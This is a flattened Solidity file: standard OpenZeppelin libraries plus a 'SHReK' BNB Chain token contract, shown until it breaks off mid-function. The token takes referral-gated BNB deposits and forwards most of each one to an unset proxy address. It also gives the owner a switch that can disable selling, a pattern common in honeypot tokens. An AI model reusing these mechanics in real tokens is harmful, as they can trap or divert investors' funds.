// SPDX-License-Identifier: MIT

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.20;

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol


// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.20;


/**
 * @dev Interface for the optional metadata functions from the ERC-20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)

pragma solidity ^0.8.20;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

// File: @openzeppelin/contracts/interfaces/draft-IERC6093.sol


// OpenZeppelin Contracts (last updated v5.1.0) (interfaces/draft-IERC6093.sol)
pragma solidity ^0.8.20;

/**
 * @dev Standard ERC-20 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.
 */
interface IERC20Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC20InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC20InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     * @param allowance Amount of tokens a `spender` is allowed to operate with.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC20InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC20InvalidSpender(address spender);
}

/**
 * @dev Standard ERC-721 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-721 tokens.
 */
interface IERC721Errors {
    /**
     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in ERC-20.
     * Used in balance queries.
     * @param owner Address of the current owner of a token.
     */
    error ERC721InvalidOwner(address owner);

    /**
     * @dev Indicates a `tokenId` whose `owner` is the zero address.
     * @param tokenId Identifier number of a token.
     */
    error ERC721NonexistentToken(uint256 tokenId);

    /**
     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param tokenId Identifier number of a token.
     * @param owner Address of the current owner of a token.
     */
    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC721InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC721InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param tokenId Identifier number of a token.
     */
    error ERC721InsufficientApproval(address operator, uint256 tokenId);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC721InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC721InvalidOperator(address operator);
}

/**
 * @dev Standard ERC-1155 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-1155 tokens.
 */
interface IERC1155Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     * @param tokenId Identifier number of a token.
     */
    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC1155InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC1155InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param owner Address of the current owner of a token.
     */
    error ERC1155MissingApprovalForAll(address operator, address owner);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC1155InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC1155InvalidOperator(address operator);

    /**
     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.
     * Used in batch transfers.
     * @param idsLength Length of the array of token identifiers
     * @param valuesLength Length of the array of token amounts
     */
    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v5.3.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.20;





/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC-20
 * applications.
 */
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * Both values are immutable: they can only be set once during construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Skips emitting an {Approval} event indicating an allowance update. This is not
     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner`'s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     *
     * ```solidity
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner`'s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance < type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)

pragma solidity ^0.8.20;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/security/ReentrancyGuard.sol


// OpenZeppelin Contracts (last updated v4.9.0) (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be _NOT_ENTERED
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == _ENTERED;
    }
}

// File: @openzeppelin/contracts/utils/Errors.sol


// OpenZeppelin Contracts (last updated v5.1.0) (utils/Errors.sol)

pragma solidity ^0.8.20;

/**
 * @dev Collection of common custom errors used in multiple contracts
 *
 * IMPORTANT: Backwards compatibility is not guaranteed in future versions of the library.
 * It is recommended to avoid relying on the error API for critical functionality.
 *
 * _Available since v5.1._
 */
library Errors {
    /**
     * @dev The ETH balance of the account is not enough to perform the operation.
     */
    error InsufficientBalance(uint256 balance, uint256 needed);

    /**
     * @dev A call to an address target failed. The target may have reverted.
     */
    error FailedCall();

    /**
     * @dev The deployment failed.
     */
    error FailedDeployment();

    /**
     * @dev A necessary precompile is missing.
     */
    error MissingPrecompile(address);
}

// File: @openzeppelin/contracts/utils/Address.sol


// OpenZeppelin Contracts (last updated v5.2.0) (utils/Address.sol)

pragma solidity ^0.8.20;


/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev There's no code at `target` (it is not a contract).
     */
    error AddressEmptyCode(address target);

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.8.20/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        if (address(this).balance < amount) {
            revert Errors.InsufficientBalance(address(this).balance, amount);
        }

        (bool success, bytes memory returndata) = recipient.call{value: amount}("");
        if (!success) {
            _revert(returndata);
        }
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason or custom error, it is bubbled
     * up by this function (like regular Solidity function calls). However, if
     * the call reverted with no returned reason, this function reverts with a
     * {Errors.FailedCall} error.
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        if (address(this).balance < value) {
            revert Errors.InsufficientBalance(address(this).balance, value);
        }
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and reverts if the target
     * was not a contract or bubbling up the revert reason (falling back to {Errors.FailedCall}) in case
     * of an unsuccessful call.
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata
    ) internal view returns (bytes memory) {
        if (!success) {
            _revert(returndata);
        } else {
            // only check if target is a contract if the call was successful and the return data is empty
            // otherwise we already know that it was a contract
            if (returndata.length == 0 && target.code.length == 0) {
                revert AddressEmptyCode(target);
            }
            return returndata;
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and reverts if it wasn't, either by bubbling the
     * revert reason or with a default {Errors.FailedCall} error.
     */
    function verifyCallResult(bool success, bytes memory returndata) internal pure returns (bytes memory) {
        if (!success) {
            _revert(returndata);
        } else {
            return returndata;
        }
    }

    /**
     * @dev Reverts with returndata if present. Otherwise reverts with {Errors.FailedCall}.
     */
    function _revert(bytes memory returndata) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            assembly ("memory-safe") {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert Errors.FailedCall();
        }
    }
}

// File: token.sol


pragma solidity ^0.8.0;






interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapPair {
    function sync() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function totalSupply() external view returns (uint256);
}

contract SHReKToken is ERC20, Ownable, ReentrancyGuard {

    using Address for address;
    uint256 public immutable TOTAL_SUPPLY;
    address public constant FACTORY_ADDRESS = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public constant WBNB_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant USDT_ADDRESS = 0x55d398326f99059fF775485246999027B3197955;
    address public constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address public liquidityPool;
    address public adminAddress;
    address public operatorAddress;
    address public proxyContract;
    address public rewardAddress = 0x70612B9308D14F8Ff0065Fc16194d38091f0EDd0;
    address public feeReceiver = 0x314BEd917ab50F366a048443039d6710ED461499;
    uint256 public startTimestamp;
    mapping(address => bool) public isExcludedFromFee;
    bool public canSell;
    uint256 public maxBNB;
    mapping(address => address) public superior;
    mapping(address => mapping(address => bool)) public transferIntent;
    mapping(address => bool) public isValidUser;
    mapping(address => uint256) public validCount;
    mapping(address => uint256) public userReceivedBNB;
    mapping(address => uint256) public lpHolderAmount;
    address[] public lpHolderList;
    mapping(address => uint256) public lpHolderIndex;
    bool public isReleasing;
    uint256 public releaseDuration;
    uint256 public lastReleaseTime;
    uint256 public releaseLpStage;
    struct ReleaseLpConfig {
        uint256 poolBnbValue;
        uint256 totalPercent;
        uint256 burnPercent;
        uint256 lpPercent;
    }
    ReleaseLpConfig[] public releaseLpConfigs;
    struct DividendRound {
        uint256 startTime;
        uint256 totalAmount;
        uint256 lpAmount;
        uint256 processedIndex;
        bool finished;
    }
    DividendRound[] public dividendRounds;
    uint256 public constant MAX_BATCH = 50;
    address[] public releaseLpFeeReceiver1;
    mapping(address => uint256) private releaseLpFeeIndexMap1;
    address[] public releaseLpFeeReceiver2;
    mapping(address => uint256) private releaseLpFeeIndexMap2;

    event SuperiorBound(address indexed user, address indexed superior);
    event FeeRecord(address indexed receiver, uint256 indexed amount);

    modifier onlyAdmin() {
        require(msg.sender == adminAddress, "Not admin");
        _;
    }

    constructor(address _to, address _adminAddress, address _operatorAddress) ERC20("SHReK", "SHReK") Ownable(msg.sender) {
        TOTAL_SUPPLY = 210_000_000_000 * 10 ** decimals();
        _mint(_to, TOTAL_SUPPLY);

        liquidityPool = IUniswapFactory(FACTORY_ADDRESS).createPair(WBNB_ADDRESS, address(this));

        adminAddress = _adminAddress;
        operatorAddress = _operatorAddress;

        isExcludedFromFee[msg.sender] = true;
        startTimestamp = block.timestamp;
        lastReleaseTime = block.timestamp;
        maxBNB = 1 ether;
        releaseDuration = 24 hours;

        _initReleaseConfigs();
    }

    function _initReleaseConfigs() private {
        releaseLpConfigs.push(ReleaseLpConfig(10000, 50, 25, 25));
        releaseLpConfigs.push(ReleaseLpConfig(100000, 100, 50, 50));
        releaseLpConfigs.push(ReleaseLpConfig(300000, 150, 75, 75));
        releaseLpStage = 0;
    }

    function setSellEnabled(bool _enabled) external onlyOwner {
        canSell = _enabled;
    }

    receive() external payable {
        require(msg.value >= 0.1 ether, "Deposit must be higher than 0.1 BNB");
        require(msg.value <= 1 ether, "Deposit must be less than 1 BNB");
        if (block.timestamp <= startTimestamp + 72 hours) {
            require(msg.value >= 0.1 ether && msg.value <= 0.2 ether, "Deposit must be between 0.1 and 0.2 BNB in first 72 hours");
            require(superior[msg.sender] != address(0), "No recommendation relationship");
        }
        require(userReceivedBNB[msg.sender] + msg.value <= maxBNB, "Subscribe to a maximum of 1 BNB");
        _handleReceivedBNB(msg.sender, msg.value);
    }

    function _handleReceivedBNB(address sender, uint256 amount) internal nonReentrant {
        if (!isReleasing && ((dividendRounds.length > 0 && !dividendRounds[dividendRounds.length-1].finished) || block.timestamp >= lastReleaseTime + releaseDuration)) {
            _settleRelease();
        }
        userReceivedBNB[sender] += amount;
        address sup = superior[sender];
        if (sup != address(0) && !isValidUser[sender]) {
            isValidUser[sender] = true;
            validCount[sup] += 1;
        }
        uint256 rewardAmount = amount * 30 / 100;
        _distributeFees(sender, rewardAmount);
        uint256 feeAmount = amount - rewardAmount;
        (bool success, ) = proxyContract.call{value: feeAmount}(abi.encodeWithSignature("receiveBNB(address)", sender));
        require(success, "Transfer to proxy contract address failed");
     }

    function _distributeFees(address sender, uint256 feeAmount) internal {
        require(feeAmount > 0, "FeeAmount must be positive");
